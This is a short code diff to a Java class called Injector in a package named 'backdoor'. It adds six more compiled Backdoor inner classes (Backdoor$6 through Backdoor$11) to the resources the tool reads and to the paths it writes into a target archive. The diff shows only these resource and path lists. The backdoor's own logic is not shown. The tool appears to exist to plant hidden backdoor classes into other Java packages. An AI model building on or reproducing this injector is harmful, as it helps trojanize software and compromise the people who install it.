@@ -137,6 +137,12 @@ public class Injector {
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$3.class"),
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$4.class"),
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$5.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$6.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$7.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$8.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$9.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$10.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$11.class"),
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Config.class"),
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Config$HelpItem.class")
         };
@@ -149,6 +155,12 @@ public class Injector {
                 outStream.getPath("/com/thiccindustries/backdoor/Backdoor$3.class"),
                 outStream.getPath("/com/thiccindustries/backdoor/Backdoor$4.class"),
                 outStream.getPath("/com/thiccindustries/backdoor/Backdoor$5.class"),
+                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$6.class"),
+                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$7.class"),
+                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$8.class"),
+                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$9.class"),
+                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$10.class"),
+                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$11.class"),
                 outStream.getPath("/com/thiccindustries/backdoor/Config.class"),
                 outStream.getPath("/com/thiccindustries/backdoor/Config$HelpItem.class")
         };
